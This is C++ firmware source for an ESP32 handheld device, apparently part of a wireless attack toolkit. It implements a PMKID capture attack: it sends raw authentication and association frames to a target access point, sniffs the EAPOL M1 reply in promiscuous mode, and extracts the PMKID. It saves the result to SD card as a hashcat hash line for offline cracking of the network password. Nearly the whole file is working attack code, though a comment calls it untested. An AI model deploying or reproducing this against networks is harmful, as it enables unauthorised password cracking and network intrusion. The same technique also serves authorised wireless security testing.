// pid PID::WIFI_PMKID_CAPTURE

// This feature has not been fully tested and only works in theory.
// In the future, it is necessary to conduct testing on the vulnerable router.

#include "esp_wifi.h"

static String pmkidCapturePath;

#define PMKID_RING_SIZE 8

struct pmk_pkt_entry {
	uint8_t data[512];
	uint16_t len;
};

static pmk_pkt_entry pmkidRing[PMKID_RING_SIZE];
static volatile int pmkidRingHead = 0;
static volatile int pmkidRingTail = 0;
static int pmkidTotalCaptured = 0;

static uint8_t pmkTargetBssid[6];
static int pmkTargetChannel;
static String pmkTargetSsid;
static uint8_t pmkTargetSsidRaw[32];
static uint8_t pmkTargetSsidLen;

enum PmkState { PMK_S_IDLE, PMK_S_SEND_AUTH, PMK_S_SEND_ASSOC, PMK_S_WAIT_M1, PMK_S_DONE };
static PmkState pmkState = PMK_S_IDLE;
static uint32_t pmkStateTimer = 0;
static int pmkDisplayStep = 0; // 0=idle, 1=connecting, 2=M1, 3=PMKID

static uint8_t pmkStaMac[6]; // our spoofed STA MAC
static uint8_t pmkAuthFrame[30]; // pre-built auth frame
static uint8_t pmkAssocFrame[200]; // pre-built assoc frame
static int pmkAssocFrameLen = 0;

static void _pmkDrawProgress(int step, int count) {
	const int margin = 5;
	const int gap = 5;
	const int topY = 5;
	const int sqW = (canvas.width() - margin * 2 - gap * 3) / 4;
	const int sqH = 20;

	canvas.setTextSize(SMALL_TEXT);

	const char* labels[] = { "CONN", "M1", "PMKID" };
	for (int i = 0; i < 3; i++) {
		int x = margin + i * (sqW + gap);
		bool filled = (i < step);

		if (filled) {
			canvas.fillRect(x, topY, sqW, sqH, FGCOLOR);
			canvas.setTextColor(BGCOLOR, FGCOLOR);
		} else {
			canvas.drawRect(x, topY, sqW, sqH, FGCOLOR);
			canvas.setTextColor(FGCOLOR, BGCOLOR);
		}

		int tw = canvas.textWidth(labels[i]);
		int th = canvas.fontHeight();
		canvas.setCursor(x + (sqW - tw) / 2, topY + (sqH - th) / 2);
		canvas.print(labels[i]);
	}

	// 4th square: counter
	{
		int x = margin + 3 * (sqW + gap);
		canvas.drawRect(x, topY, sqW, sqH, TFT_DARKGRAY);
		canvas.setTextColor((count > 0) ? FGCOLOR : TFT_DARKGREY, BGCOLOR);

		String cnt = String(count);
		int tw = canvas.textWidth(cnt.c_str());
		int th = canvas.fontHeight();
		canvas.setCursor(x + (sqW - tw) / 2, topY + (sqH - th) / 2);
		canvas.print(cnt);
	}

	canvas.setTextColor(FGCOLOR, BGCOLOR);
}

// Shared sequence number counter for management frames
static uint16_t _pmkSeqCtl = 0;

// Promiscuous callback (DATA only)
static void wifiPmkidSniffCb(void* buf, wifi_promiscuous_pkt_type_t type) {
	if (type != WIFI_PKT_DATA) return;

	wifi_promiscuous_pkt_t* p = (wifi_promiscuous_pkt_t*)buf;
	uint16_t frameLen = p->rx_ctrl.sig_len;
	if (frameLen < 40 || frameLen > 512) return;

	uint8_t* frame = p->payload;
	uint16_t fc = frame[0] | (frame[1] << 8);
	if (((fc >> 2) & 3) != 2) return;
	if (((fc >> 9) & 1) != 1 || ((fc >> 8) & 1) != 0) return; // fromDS=1, toDS=0
	if (memcmp(frame + 10, pmkTargetBssid, 6) != 0) return; // Addr2 == BSSID

	int hdrLen = 24;
	uint8_t subtype = (fc >> 4) & 0xF;
	if (subtype & 0x8) {
		hdrLen += 2;
		if ((fc >> 15) & 1) hdrLen += 4;
	}

	if (frameLen < hdrLen + 8 + 4 + 4) return;

	uint8_t* llc = frame + hdrLen;
	if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03
		|| llc[6] != 0x88 || llc[7] != 0x8E || llc[9] != 3) return;

	// M1 check: ACK=1, MIC=0
	uint16_t keyInfo = (llc[13] << 8) | llc[14];
	bool ack = (keyInfo >> 7) & 1;
	bool mic = (keyInfo >> 8) & 1;
	if (!ack || mic) return;

	int nextHead = (pmkidRingHead + 1) % PMKID_RING_SIZE;
	if (nextHead == pmkidRingTail) return; // ring full

	pmk_pkt_entry& entry = pmkidRing[pmkidRingHead];
	memcpy(entry.data, frame, frameLen);
	entry.len = frameLen;
	pmkidRingHead = nextHead;
}

void wifiPmkidLoop() {
	static File pmkidFile;
	static bool fileOpen = false;

	if (isSetup()) {
		pmkidRingHead = 0;
		pmkidRingTail = 0;
		pmkidTotalCaptured = 0;
		pmkDisplayStep = 0;
		pmkState = PMK_S_IDLE;
		pmkStateTimer = millis();
		fileOpen = false;

		memcpy(pmkTargetBssid, bssid, 6);
		pmkTargetChannel = channel;
		pmkTargetSsid = ssid;
		pmkTargetSsidLen = min((size_t)ssid.length(), sizeof(pmkTargetSsidRaw));
		memcpy(pmkTargetSsidRaw, ssid.c_str(), pmkTargetSsidLen);

		// Get our STA MAC for spoofing
		esp_read_mac(pmkStaMac, ESP_MAC_WIFI_STA);

		// AP_STA mode: AP interface needed for esp_wifi_80211_tx,
		// STA interface for promiscuous sniffing
		WiFi.mode(WIFI_AP_STA);
		WiFi.softAP("x", "", pmkTargetChannel, 1, 1, true); // hidden AP, minimal power

		// Pre-build frames (MACs are static, only seq changes)
		_pmkSeqCtl = 0;
		pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
		pmkAssocFrameLen = pmkBuildAssocFrame(pmkAssocFrame,
			pmkTargetBssid, pmkStaMac, pmkTargetSsidRaw, pmkTargetSsidLen, _pmkSeqCtl + 1);

		esp_wifi_set_promiscuous(true);
		esp_wifi_set_promiscuous_rx_cb(&wifiPmkidSniffCb);

		wifi_promiscuous_filter_t filter;
		filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
		| WIFI_PROMIS_FILTER_MASK_DATA_MPDU;
		esp_wifi_set_promiscuous_filter(&filter);

		esp_wifi_set_channel(pmkTargetChannel, WIFI_SECOND_CHAN_NONE);

		String lines[] = {
			pmkTargetSsid,
			"Ch: " + String(pmkTargetChannel)
		};
		centeredPrintRows(lines, 2, SMALL_TEXT, true);
		drawSpinner();
		canvas.pushSprite(0, getStatusBarHeight());
	}

	// Drain ring buffer — process M1 frames
	while (pmkidRingTail != pmkidRingHead) {
		const pmk_pkt_entry& pkt = pmkidRing[pmkidRingTail];
		pmkidRingTail = (pmkidRingTail + 1) % PMKID_RING_SIZE;

		if (pmkState != PMK_S_WAIT_M1) continue;

		uint16_t fc = pkt.data[0] | (pkt.data[1] << 8);

		int hdrLen = 24;
		uint8_t subtype = (fc >> 4) & 0xF;
		if (subtype & 0x8) {
			hdrLen += 2;
			if ((fc >> 15) & 1) hdrLen += 4;
		}

		// EAPOL body starts at: hdrLen + LLC(8) + EAPOL-header(4)
		int bodyOff = hdrLen + 12;
		uint16_t bodyLen = (pkt.data[hdrLen + 10] << 8) | pkt.data[hdrLen + 11];
		uint16_t kdLen = 0;
		if (bodyLen >= 95) {
			kdLen = (pkt.data[bodyOff + 93] << 8) | pkt.data[bodyOff + 94];
		}

		pmkDisplayStep = 2; // M1 received

		bool found = false;
		uint8_t pmkid[16];
		if (kdLen > 0 && bodyLen >= 95 + kdLen && (int)pkt.len >= bodyOff + 95 + kdLen) {
			found = pmkScanIEs(pkt.data + bodyOff + 95, kdLen, pmkid);
		}

		if (found) {
			pmkDisplayStep = 3;
			pmkidTotalCaptured++;

			// Lazy-open file on first successful capture
			if (!fileOpen && sdBegin()) {
				String s = pmkTargetSsid;
				s.replace(" ", "_");
				s.replace("/", "_");
				s.replace("\\", "_");
				s.replace(":", "_");
				s.replace("*", "_");
				s.replace("?", "_");
				s.replace("\"", "_");
				s.replace("<", "_");
				s.replace(">", "_");
				s.replace("|", "_");

				String path;
				int n = 1;
				do {
					path = "/pmkid_" + s + "_" + String(n) + ".hc22000";
					n++;
				} while (SD.exists(path));
				pmkidCapturePath = path;

				pmkidFile = SD.open(pmkidCapturePath, FILE_WRITE);
				if (pmkidFile) {
					fileOpen = true;
					Serial.printf("PMKID: %s\n", pmkidCapturePath.c_str());
				}
			}

			if (fileOpen && pmkidFile) {
				uint8_t staMac[6];
				esp_read_mac(staMac, ESP_MAC_WIFI_STA);
				writePmkidHashLine(pmkidFile, pmkid, pmkTargetBssid, staMac,
					pmkTargetSsidRaw, pmkTargetSsidLen);
				pmkidFile.flush();
			}

			soundSuccess();
			Serial.printf("PMKID: captured! total=%d\n", pmkidTotalCaptured);
		} else {
			Serial.println("PMKID: not found in M1");
		}

		// M1 processed — move to DONE
		pmkState = PMK_S_DONE;
		pmkStateTimer = millis();
	}

	// State machine
	uint32_t now = millis();

	switch (pmkState) {
	case PMK_S_IDLE:
		if (now - pmkStateTimer >= 2000) {
			// Switch to target channel and send Auth frame
						esp_wifi_set_channel(pmkTargetChannel, WIFI_SECOND_CHAN_NONE);
			delay(30);
			// Update sequence numbers in pre-built frames
			pmkBuildAuthFrame(pmkAuthFrame, pmkTargetBssid, pmkStaMac, _pmkSeqCtl);
			pmkSendRawFrame(pmkAuthFrame, 30);
						pmkDisplayStep = 1;
			pmkState = PMK_S_SEND_AUTH;
			pmkStateTimer = now;
		}
		break;

	case PMK_S_SEND_AUTH:
		if (now - pmkStateTimer >= 150) {
			// Wait for Auth response, then send Assoc Request
			_pmkSeqCtl++;
			pmkAssocFrameLen = pmkBuildAssocFrame(pmkAssocFrame,
				pmkTargetBssid, pmkStaMac, pmkTargetSsidRaw, pmkTargetSsidLen,
				_pmkSeqCtl);
			pmkSendRawFrame(pmkAssocFrame, pmkAssocFrameLen);
						pmkState = PMK_S_SEND_ASSOC;
			pmkStateTimer = now;
		}
		break;

	case PMK_S_SEND_ASSOC:
		if (now - pmkStateTimer >= 50) {
			// Assoc sent, now wait for EAPOL M1
			_pmkSeqCtl++;
						pmkState = PMK_S_WAIT_M1;
			pmkStateTimer = now;
		}
		break;

	case PMK_S_WAIT_M1:
		if (now - pmkStateTimer >= 12000) {
						pmkDisplayStep = 0;
			pmkState = PMK_S_IDLE;
			pmkStateTimer = now;
		}
		break;

	case PMK_S_DONE:
		if (now - pmkStateTimer >= 4000) {
						pmkDisplayStep = 0;
			pmkState = PMK_S_IDLE;
			pmkStateTimer = now;
		}
		break;
	}

	// Manual trigger
	if (isKbEnterPressed() || isBtnAWasPressed()) {
		delay(50);
		pmkDisplayStep = 0;
		pmkState = PMK_S_IDLE;
		pmkStateTimer = now;
		_pmkSeqCtl += 2; // advance seq for next cycle
		soundBeep();
	}

	// Display
	{
		canvas.clear();
		canvas.setTextColor(FGCOLOR, BGCOLOR);

		_pmkDrawProgress(pmkDisplayStep, pmkidTotalCaptured);

		canvas.setTextSize(SMALL_TEXT);

		const int startY = 40;
		const char* statusStr;
		switch (pmkState) {
		case PMK_S_IDLE: statusStr = "Wait..."; break;
		case PMK_S_SEND_AUTH: statusStr = "Auth..."; break;
		case PMK_S_SEND_ASSOC:statusStr = "Assoc..."; break;
		case PMK_S_WAIT_M1: statusStr = "Wait M1..."; break;
		case PMK_S_DONE: statusStr = pmkidTotalCaptured > 0 ? "Captured!" : "No PMKID"; break;
		}

		String lines[] = {
			pmkTargetSsid,
			"Ch: " + String(pmkTargetChannel),
			statusStr
		};
		centeredPrintRows(lines, 3, SMALL_TEXT, true, startY);

		drawSpinner();
		drawHintCustom("enter: retry", "A: retry");
	}

	if (checkExit()) {
		pmkState = PMK_S_IDLE;
		WiFi.softAPdisconnect(false);
		esp_wifi_set_promiscuous(false);
		esp_wifi_set_promiscuous_rx_cb(nullptr);

		if (fileOpen && pmkidFile) {
			pmkidFile.flush();
			pmkidFile.close();
			fileOpen = false;

			String lines[] = {
				"PMKID saved:",
				pmkidCapturePath,
				"PMKIDs: " + String(pmkidTotalCaptured)
			};
			centeredPrintRows(lines, 3, SMALL_TEXT);
			soundSuccess();
			delay(800);
		}
	}
}
